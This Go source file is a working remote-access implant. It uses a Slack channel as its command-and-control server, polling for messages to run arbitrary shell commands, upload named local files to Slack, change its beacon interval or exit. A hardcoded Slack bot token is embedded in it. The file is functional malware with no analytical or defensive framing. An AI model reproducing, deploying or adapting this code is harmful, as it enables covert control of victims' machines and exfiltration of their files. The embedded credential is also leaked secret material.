package main

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/asmcos/requests"
	"github.com/tidwall/gjson"
)

const (
	HistoryApi  = "https://slack.com/api/conversations.history"
	PostMessage = "https://slack.com/api/chat.postMessage"
	FileUpload  = "https://slack.com/api/files.upload"
	Token       = "xoxb-3425351798694-3429113403365-vurOGDcXJllSssHwVTOmz2bm"
	Channel     = "C03CSA39QBW"
)

var Timer = 10

func sleep() {
	fmt.Sprintf("sleep %s", Timer)
	time.Sleep(time.Duration(Timer) * time.Second)
}
func main() {
	ApiPost("hello,Yihsiwei", PostMessage)
	for true {
		result := ApiGet(HistoryApi, "messages.0.text")
		fmt.Println(result)
		if strings.HasPrefix(result.Str, "shell") {
			cmdRes := ExecCommand(strings.Split(result.Str, " ")[1:])
			ApiPost(cmdRes, PostMessage)
		} else if strings.HasPrefix(result.Str, "exit") {
			os.Exit(0)
		} else if strings.HasPrefix(result.Str, "sleep") {
			s := strings.Split(result.Str, " ")[1]
			atoi, err := strconv.Atoi(s)
			if err != nil {
				ApiPost(err.Error(), PostMessage)
			}
			Timer = atoi
		} else if strings.HasPrefix(result.Str, "download") {
			filename := strings.Split(result.Str, " ")[1]
			ApiUpload(filename)
		} else {
			fmt.Println("no command")
		}
		sleep()
	}
}

func ExecCommand(command []string) (out string) {
	fmt.Println(command)
	cmd := exec.Command(command[0], command[1:]...)
	o, err := cmd.CombinedOutput()

	if err != nil {
		out = fmt.Sprintf("shell run error: \n%s\n", err)
	} else {
		out = fmt.Sprintf("combined out:\n%s\n", string(o))
	}
	return
}

// Manage the HTTP GET request parameters
type GetRequest struct {
	urls url.Values
}

// Initializer
func (p *GetRequest) Init() *GetRequest {
	p.urls = url.Values{}
	return p
}

// Initialized from another instance
func (p *GetRequest) InitFrom(reqParams *GetRequest) *GetRequest {
	if reqParams != nil {
		p.urls = reqParams.urls
	} else {
		p.urls = url.Values{}
	}
	return p
}

// Add URL escape property and value pair
func (p *GetRequest) AddParam(property string, value string) *GetRequest {
	if property != "" && value != "" {
		p.urls.Add(property, value)
	}
	return p
}

// Concat the property and value pair
func (p *GetRequest) BuildParams() string {
	return p.urls.Encode()
}
func ApiGet(apiUrl string, rule string) gjson.Result {
	init := new(GetRequest).Init()
	params := init.AddParam("channel", Channel).AddParam("pretty", "1").AddParam("limit", "1").BuildParams()
	req := requests.Requests()
	req.Header.Set("Authorization", "Bearer "+Token)
	resp, _ := req.Get(apiUrl + "?" + params)

	//fmt.Println(resp.Text())

	bytes, _ := ioutil.ReadAll(strings.NewReader(resp.Text()))
	//fmt.Println(string(bytes))
	return gjson.GetBytes(bytes, rule)
}
func ApiPost(text string, apiUrl string) {
	var r http.Request
	r.ParseForm()
	r.Form.Add("token", Token)
	r.Form.Add("channel", Channel)
	r.Form.Add("pretty", "1")
	r.Form.Add("text", text)
	r.Form.Add("mrkdwn", "false")
	body := strings.NewReader(r.Form.Encode())
	response, err := http.Post(apiUrl, "application/x-www-form-urlencoded", body)
	if err != nil {
		return
	}
	bytes, _ := ioutil.ReadAll(response.Body)
	ok := gjson.GetBytes(bytes, "ok")
	fmt.Println(ok)
}
func ApiUpload(filename string) {
	//fmt.Println(filename)
	// 创建表单文件
	// CreateFormFile 用来创建表单，第一个参数是字段名，第二个参数是文件名
	buf := new(bytes.Buffer)
	writer := multipart.NewWriter(buf)
	writer.WriteField("token", Token)
	writer.WriteField("pretty", "1")
	writer.WriteField("channels", Channel)
	//writer.WriteField("filetype", "text")
	formFile, err := writer.CreateFormFile("file", filepath.Base(filename))
	if err != nil {
		log.Fatalf("Create form file failed: %s\n", err)
	}

	// 从文件读取数据，写入表单
	srcFile, err := os.Open(filename)
	if err != nil {
		log.Fatalf("%Open source file failed: s\n", err)
	}
	defer srcFile.Close()
	_, err = io.Copy(formFile, srcFile)
	if err != nil {
		log.Fatalf("Write to form file falied: %s\n", err)
	}

	// 发送表单
	contentType := writer.FormDataContentType()
	writer.Close() // 发送之前必须调用Close()以写入结尾行
	_, err = http.Post(FileUpload, contentType, buf)
	if err != nil {
		log.Fatalf("Post failed: %s\n", err)
	}
	//all, err := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(all))
}
